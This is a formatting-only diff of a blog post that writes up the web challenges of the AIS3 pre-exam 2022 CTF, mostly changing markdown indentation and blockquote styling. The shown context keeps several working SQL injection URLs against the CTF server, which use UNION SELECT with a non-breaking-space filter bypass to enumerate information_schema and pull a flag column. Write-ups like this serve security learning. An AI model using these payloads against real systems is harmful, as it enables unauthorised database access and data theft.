@@ -2,10 +2,10 @@
 title: AIS3 pre-exam 2022 web write up
 date: 2022-06-06 21:19:46
 tags:
-- ctf
-- ais3
-- write up
-- web security
+    - ctf
+    - ais3
+    - write up
+    - web security
 ---
 
 ## Introduction
@@ -21,10 +21,10 @@ And I could only solve web question, so that's it :( Let's start.
 ### Poking Bear
 
 > Solved 205/292
-  Interest ★
-  Difficulty ☆
-  New-knowledge ☆
-  Bear ★★★
+> Interest ★
+> Difficulty ☆
+> New-knowledge ☆
+> Bear ★★★
 
 ![](https://i.imgur.com/VKWCNJv.png)
 
@@ -62,10 +62,10 @@ Works!
 ### Simple File Uploader
 
 > Solved 92/292
-  Interest ★
-  Difficulty ☆
-  New-knowledge ☆
-  p...php ?? (((ﾟДﾟ;))) ★★★
+> Interest ★
+> Difficulty ☆
+> New-knowledge ☆
+> p...php ?? (((ﾟ Д ﾟ;))) ★★★
 
 ![](https://i.imgur.com/GVR5fve.png)
 
@@ -182,10 +182,10 @@ And executed it with:
 ### The Best Login UI
 
 > Solved 32/292
-  Interest ★★
-  Difficulty ★
-  New-knowledge ★★
-  Be...st.. UI ☆
+> Interest ★★
+> Difficulty ★
+> New-knowledge ★★
+> Be...st.. UI ☆
 
 The question provide the source code, so that's it:
 
@@ -268,17 +268,20 @@ Just remember to escape some special characters to avoid error.(line 12) And eve
 ### TariTari
 
 > Solved 26/292
-  Interest ★★
-  Difficulty ★☆
-  New-knowledge ★
-  Disappointment ★★★ (When I saw a flag but not for me QQ)<br>
+> Interest ★★
+> Difficulty ★☆
+> New-knowledge ★
+> Disappointment ★★★ (When I saw a flag but not for me QQ)<br>
 
 ![](https://i.imgur.com/OXdNd9d.png)
 
 Uploaded some file and got a response like:
 
 ```html
-<a href="/download.php?file=ZjY0MGNjOWQ0ZTQwYzAwODliYmIxZjg1OGI2NWEwMmEudGFyLmd6&amp;name=removed.png.tar.gz.tar.gz">Download</a>
+<a
+    href="/download.php?file=ZjY0MGNjOWQ0ZTQwYzAwODliYmIxZjg1OGI2NWEwMmEudGFyLmd6&amp;name=removed.png.tar.gz.tar.gz"
+    >Download</a
+>
 ```
 
 Try to change `name`, but got a error:
@@ -370,10 +373,10 @@ Bypass success! and just print out the flag
 ### Cat Emoji Database
 
 > Solved 15/292
-  Interest ★★☆
-  Difficulty ★★☆
-  New-knowledge ★★☆
-  CATS😻 ★★★★★<br>
+> Interest ★★☆
+> Difficulty ★★☆
+> New-knowledge ★★☆
+> CATS😻 ★★★★★<br>
 
 It provided source code too:
 
@@ -441,14 +444,14 @@ Through `@@version`, we knew it's SQL Server.
 
 So we can bypass space with `%C2%A0` and some parentheses.
 This will show table_schema, table_name, and column_name, but only first table because of the `fetchone()` in source code. And the first table is `Emoji`. So that's not table we need.
-[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns)](http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns))
+[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns)](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema.columns)>)
 
 So let's skip `Emoji` table by `WHERE`.
-[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji')](http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji'))
+[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji')](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),concat_ws(0x3a,table_schema,table_name,column_name),(''),(''),('1')%C2%A0from.information_schema."columns"where"table_name"!='Emoji')>)
 ![](https://i.imgur.com/TebGMb8.png)
 
 Found a table and column seems has flag, so let's select it.
-[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3)](http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3))
+[http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3)](<http://chals1.ais3.org:9487/api/emoji/(12800996)union(SeLECT(1),(m1ght_be_th3_f14g),(''),(''),('1')%C2%A0from.s3cr3t_fl4g_in_th1s_t4bl3)>)
 ![](https://i.imgur.com/L0bDRj8.png)
 
 Got the flag successfully!
@@ -456,10 +459,10 @@ Got the flag successfully!
 ### Private Browsing
 
 > Solved 4/292
-  Interest ★★☆
-  Difficulty ★★★
-  New-knowledge ★★★
-  What-a-pity ★★★
+> Interest ★★☆
+> Difficulty ★★★
+> New-knowledge ★★★
+> What-a-pity ★★★
 
 ![](https://i.imgur.com/k9yvWzM.jpg)
 
@@ -605,10 +608,10 @@ There is the [write up](https://github.com/maple3142/My-CTF-Challenges/tree/mast
 ### Gallery
 
 > Solved 4/292
-  Interest ★★★
-  Difficulty ★★★☆
-  New-knowledge ★★★
-  What-a-pity ★★★
+> Interest ★★★
+> Difficulty ★★★☆
+> New-knowledge ★★★
+> What-a-pity ★★★
 
 Some source code from question:
 
@@ -868,5 +871,5 @@ This time is my first time to participated a ctf seriously XD. But I need to wor
 
 ## References
 
-- <https://portswigger.net/web-security/sql-injection/cheat-sheet>
-- <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
+-   <https://portswigger.net/web-security/sql-injection/cheat-sheet>
+-   <https://portswigger.net/web-security/cross-site-scripting/cheat-sheet>
